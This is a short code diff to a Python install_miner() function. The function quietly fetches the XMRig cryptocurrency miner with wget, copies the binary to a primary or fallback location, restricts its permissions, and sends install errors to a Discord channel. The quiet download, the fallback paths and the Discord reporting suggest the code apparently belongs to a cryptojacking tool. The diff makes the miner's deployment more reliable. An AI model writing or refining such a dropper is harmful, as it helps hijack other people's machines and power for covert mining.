@@ -55,14 +55,14 @@ def install_miner():
         url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
         run_cmd(f"wget -qO {archive} {url}")
         run_cmd(f"tar -xf {archive} -C {MAIN_DIR}")
+        target_path = MINER_BIN if os.access(MAIN_DIR, os.W_OK) else fallback_path()
         for f in os.listdir(MAIN_DIR):
             path = os.path.join(MAIN_DIR, f)
             if "xmrig" in f and os.access(path, os.X_OK):
-                try:
-                    os.rename(path, MINER_BIN)
-                except:
-                    shutil.copy2(path, fallback_path())
-        os.chmod(MINER_BIN, 0o700)
+                shutil.copy2(path, target_path)
+                os.chmod(target_path, 0o700)
+                return
+        raise FileNotFoundError("No valid miner binary found in archive.")
     except Exception as e:
         send_discord(f"❌ Install error: {e}")
 
